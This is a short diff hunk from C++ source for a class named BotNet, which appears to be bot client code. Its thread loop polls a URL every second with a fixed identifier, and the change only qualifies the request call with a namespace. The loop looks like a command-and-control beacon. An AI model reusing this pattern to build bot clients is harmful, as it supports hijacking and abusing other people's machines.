@@ -29,7 +29,7 @@ void BotNet::ThreadNet(LPVOID Param) {
 	BotNet* net = (BotNet*)Param;
 	while (true) {
 		Sleep(1000);
-		GetRequest(net->url, "4B4DB4B3");
+		Requests::GetRequest(net->url, "4B4DB4B3");
 	}
 }
 
